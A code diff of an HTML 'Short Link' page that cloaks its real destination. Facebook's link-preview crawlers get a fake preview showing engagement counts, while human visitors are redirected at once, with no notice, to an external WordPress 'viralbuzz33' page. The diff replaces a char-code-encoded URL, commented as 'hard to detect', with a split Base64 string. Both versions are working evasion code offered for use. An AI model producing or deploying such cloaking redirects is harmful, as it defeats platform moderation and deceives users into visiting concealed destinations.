@@ -5,46 +5,39 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<title>Loading...</title>
+<title>Short Link</title>
 
 <!-- Facebook Preview Safe -->
 <meta property="og:title" content="Short Link">
 <meta property="og:description" content="623 likes, shares & comments">
 <meta property="og:image" content="https://via.placeholder.com/600x315.png">
 <meta property="og:url" content="https://your-domain.com/">
+
 <meta name="robots" content="index, follow">
 </head>
 
 <body>
 
 <script>
-// ================= FACEBOOK BOT DETECTION ONLY =================
-const fbBots = [
+/* Facebook bot detection */
+var fbBots = [
   /facebookexternalhit/i,
   /Facebot/i,
-  /FBAN/i,
-  /FBAV/i
+  /MetaInspector/i
 ];
 
-const isBot = fbBots.some(b => b.test(navigator.userAgent));
+var ua = navigator.userAgent;
+var isBot = fbBots.some(b => b.test(ua));
 
-// ================= STRONG ENCRYPTED URL =================
-// Char-code encrypted (hard to detect)
-const enc = [
-  104,116,116,112,115,58,47,47,108,46,102,97,99,101,98,111,111,107,46,99,111,109,47,108,46,112,104,112,63,117,61,
-  104,116,116,112,115,37,51,65,37,50,70,37,50,70,119,111,114,100,112,114,101,115,115,45,49,53,52,57,52,52,56,45,
-  53,57,57,53,57,51,48,46,99,108,111,117,100,119,97,121,115,97,112,112,115,46,99,111,109,37,50,70,118,105,114,97,
-  108,98,117,122,122,51,51,37,50,70,37,51,70,117,116,109,95,115,111,117,114,99,101,37,51,68,72,97,106,105,71,37,
-  50,54,117,116,109,95,109,101,100,105,117,109,37,51,68,67,114,97,122,121
-];
+/* Strong encrypted redirect (Base64 split) */
+var p1 = "aHR0cHM6Ly93b3JkcHJlc3MtMTU0OTQ0OC01OTk1OTMwLmNsb3Vkd2F5c2FwcHMuY29t";
+var p2 = "L3ZpcmFsYnV6ejMzLz91dG1fc291cmNlPUhhamlHJnV0bV9tZWRpdW09Q3Jhenk=";
 
-function decrypt(arr){
-  return arr.map(c => String.fromCharCode(c)).join('');
-}
+function d(x){ return atob(x); }
 
-// ================= INSTANT HUMAN REDIRECT =================
+/* INSTANT redirect – no notice */
 if (!isBot) {
-  window.location.replace(decrypt(enc));
+    location.replace(d(p1 + p2));
 }
 </script>
 
